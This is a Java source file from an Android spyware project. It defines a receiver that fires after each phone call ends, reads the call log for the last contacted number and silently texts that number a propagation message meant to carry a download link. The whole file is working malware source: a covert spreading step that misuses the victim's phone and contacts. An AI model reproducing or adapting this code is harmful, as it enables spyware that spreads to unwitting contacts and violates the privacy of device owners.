package android.spyware;

import android.Manifest;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.support.v4.app.ActivityCompat;
import android.telephony.SmsManager;
import android.util.Log;

import static android.spyware.Spyware.DEV_MODE;
import static android.spyware.Spyware.TAG;

/**
 * This broadcast receiver is triggered a minute after a phone call ends. It will send a text with the text of your choice
 * to the last contacted person in the user's call log.
 */
public class SpoofSMSR extends BroadcastReceiver {
    // SMS message content to be sent, replace the DOWNLOAD the message
    private static final String MESSAGE = "<--PROPAGATE-->";

    @Override
    public void onReceive(Context context, Intent intent) {
        // Get the last call from the call log and send a message to them.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                if (DEV_MODE)
                    Log.wtf(TAG, "::ERR  SpoofSMSR.onReceive(): READ_CALL_LOG permission not granted.");
                return;
            }
        }

        Uri URI = android.provider.CallLog.Calls.CONTENT_URI;
        String[] COLUMNS = {
                android.provider.CallLog.Calls.NUMBER,
                android.provider.CallLog.Calls.CACHED_NAME
        };
        String SORT_ORDER = android.provider.CallLog.Calls.DATE + " DESC";

        Cursor cursor = context.getContentResolver().query(
                URI,
                COLUMNS,
                null,
                null,
                SORT_ORDER);

        if (cursor != null && cursor.getCount() > 0) {
            cursor.moveToFirst();
            String phoneNo = cursor.getString(cursor
                    .getColumnIndex(android.provider.CallLog.Calls.NUMBER));
            sendSMS(context, phoneNo, MESSAGE);
            cursor.close();
        }
    }

    private void sendSMS(Context context, String phoneNo, String message) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
                if (DEV_MODE)
                    Log.wtf(TAG, "::ERR  SpoofSMSR.sendSMS(): SEND_SMS permission not granted.");
                return;
            }
        }

        PendingIntent pIntent = PendingIntent.getActivity(context, 0, new Intent(), 0);
        SmsManager SMS = SmsManager.getDefault();
        SMS.sendTextMessage(phoneNo, null, message, pIntent, null);

        if (DEV_MODE)
            Log.d(TAG, "::INFO	Spoofed SMS sent to " + phoneNo);
    }
}
